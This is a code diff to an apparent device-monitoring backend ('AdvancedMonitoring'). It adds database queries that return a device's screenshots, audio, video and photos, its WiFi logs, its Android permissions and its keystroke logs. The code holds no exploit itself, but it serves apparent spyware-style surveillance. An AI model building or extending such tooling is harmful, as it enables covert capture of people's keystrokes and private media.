@@ -198,26 +198,112 @@ class AdvancedMonitoring {
     }
   }
 
-  /**
-   * Obtener capturas de media
-   */
   async getMediaCaptures(
     deviceId: number,
-    type?: "screenshot" | "audio" | "video",
+    type?: "screenshot" | "audio" | "video" | "photo",
     limit: number = 100
   ): Promise<MediaCapture[]> {
     const db = await getDb();
     if (!db) return [];
 
     try {
-      // Tabla mediaCaptures no existe aún
-      return [];
+      const { mediaFiles } = await import("../drizzle/schema");
+      const whereConditions = [eq(mediaFiles.deviceId, deviceId)];
+      if (type) {
+        whereConditions.push(eq(mediaFiles.fileType, type as any));
+      }
 
-      // Retornar capturas vacías por ahora
-      return [];
+      const files = await db
+        .select()
+        .from(mediaFiles)
+        .where(and(...whereConditions))
+        .orderBy((t) => t.timestamp)
+        .limit(limit);
+
+      return files.map((f) => ({
+        deviceId: f.deviceId,
+        type: f.fileType as any,
+        fileName: f.fileName,
+        filePath: f.fileUrl,
+        fileSize: f.fileSize || 0,
+        timestamp: f.timestamp,
+      }));
     } catch (error) {
       console.error("[AdvancedMonitoring] Error getting media captures:", error);
       return [];
+    }
+  }
+
+  /**
+   * Obtener logs de WiFi de un dispositivo
+   */
+  async getWifiLogs(deviceId: number, limit: number = 100) {
+    const db = await getDb();
+    if (!db) return [];
+
+    try {
+      const { wifiLogs } = await import("../drizzle/schema");
+      return await db
+        .select()
+        .from(wifiLogs)
+        .where(eq(wifiLogs.deviceId, deviceId))
+        .orderBy((t) => t.timestamp)
+        .limit(limit);
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error getting wifi logs:", error);
+      return [];
+    }
+  }
+
+  /**
+   * Obtener matriz de permisos de Android (desde metadata)
+   */
+  async getAndroidPermissions(deviceId: number) {
+    const db = await getDb();
+    if (!db) return null;
+
+    try {
+      const device = await db
+        .select()
+        .from(devices)
+        .where(eq(devices.id, deviceId))
+        .limit(1);
+      
+      if (device.length === 0) return null;
+      const metadata = (device[0].metadata as any) || {};
+      return {
+        permissions: metadata.androidPermissions || [],
+        lastSync: metadata.lastPermissionSync || null
+      };
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error getting android permissions:", error);
+      return null;
+    }
+  }
+
+  /**
+   * Obtener historial de keylogs (desde activityLogs)
+   */
+  async getKeylogs(deviceId: number, limit: number = 100) {
+    const db = await getDb();
+    if (!db) return [];
+
+    try {
+        const { activityLogs } = await import("../drizzle/schema");
+        return await db
+            .select()
+            .from(activityLogs)
+            .where(
+                and(
+                    eq(activityLogs.deviceId, deviceId),
+                    eq(activityLogs.activityType, "keylog")
+                )
+            )
+            .orderBy((t) => t.timestamp)
+            .limit(limit);
+    } catch (error) {
+        console.error("[AdvancedMonitoring] Error getting keylogs:", error);
+        return [];
     }
   }
 
